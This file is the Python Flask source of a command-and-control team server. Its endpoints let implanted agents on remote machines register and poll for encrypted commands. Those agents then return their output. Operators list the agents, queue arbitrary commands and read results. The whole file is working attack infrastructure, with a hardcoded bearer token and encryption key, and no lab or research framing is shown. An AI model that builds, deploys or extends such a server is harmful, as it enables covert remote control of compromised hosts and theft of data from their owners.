from flask import Flask, request, jsonify, abort
from cryptography.fernet import Fernet
import database

app = Flask(__name__)
database.init_db()

# --- SECURITY CONFIG ---
AUTH_TOKEN = "Bearer super_secret_c2_token_2026"
# PASTE YOUR GENERATED KEY BELOW:
CIPHER = Fernet(b'HWM_K4hduFt_o_OxpTkirD2pyVZ_OvsH-xlAWkggzUQ=') 

@app.before_request
def check_authentication():
    if request.headers.get('Authorization') != AUTH_TOKEN:
        abort(401)

# === IMPLANT ENDPOINTS ===
@app.route('/api/register', methods=['POST'])
def register_agent():
    data = request.json
    database.register_or_update_agent(data.get('agent_id'), request.remote_addr, data.get('hostname', 'unknown'))
    return jsonify({"status": "registered"}), 200

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    database.register_or_update_agent(agent_id, request.remote_addr, "known")
    task = database.get_pending_task(agent_id)
    if task:
        encrypted_command = CIPHER.encrypt(task['command'].encode()).decode()
        return jsonify({"task_id": task['task_id'], "command": encrypted_command}), 200
    return jsonify({"task_id": None, "command": "sleep"}), 200

@app.route('/api/results', methods=['POST'])
def submit_results():
    data = request.json
    try:
        decrypted_output = CIPHER.decrypt(data.get('output').encode()).decode()
        database.submit_task_result(data.get('task_id'), decrypted_output)
        return jsonify({"status": "success"}), 200
    except Exception:
        return jsonify({"error": "Decryption failed"}), 400

# === OPERATOR ENDPOINTS ===
@app.route('/api/operator/agents', methods=['GET'])
def list_agents():
    return jsonify(database.get_all_agents()), 200

@app.route('/api/operator/task', methods=['POST'])
def operator_queue_task():
    data = request.json
    database.queue_task(data.get('agent_id'), data.get('command'))
    return jsonify({"status": "queued"}), 200

@app.route('/api/operator/results/<agent_id>', methods=['GET'])
def operator_get_results(agent_id):
    return jsonify(database.get_agent_results(agent_id)), 200

if __name__ == '__main__':
    print("[*] Starting Secure C2 Team Server on port 5000...")
    app.run(host='0.0.0.0', port=5000)